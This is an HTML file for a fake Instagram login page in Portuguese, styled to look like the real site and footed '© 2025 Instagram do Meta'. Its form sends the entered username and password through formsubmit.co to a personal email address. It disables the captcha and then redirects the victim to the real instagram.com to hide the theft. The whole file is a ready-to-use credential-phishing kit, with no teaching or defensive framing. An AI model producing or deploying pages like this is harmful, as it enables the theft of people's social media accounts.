<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 0;
    }
    .container {
      margin-top: 50px;
      background: white;
      padding: 40px 30px;
      border: 1px solid #dbdbdb;
      width: 300px;
    }
    .logo {
      display: block;
      margin: 0 auto 20px;
      width: 180px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      color: white;
      border: none;
      border-radius: 3px;
      font-weight: bold;
      cursor: pointer;
    }
    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #8e8e8e;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram">
    <form action="https://formsubmit.co/eliclesioriosdasilva@gmail.com" method="POST">
      <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required>
      <input type="password" name="password" placeholder="Senha" required>

      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">
      <input type="hidden" name="_next" value="https://instagram.com">

      <button type="submit">Entrar</button>
    </form>
  </div>
  <div class="footer">
    © 2025 Instagram do Meta
  </div>
</body>
</html>
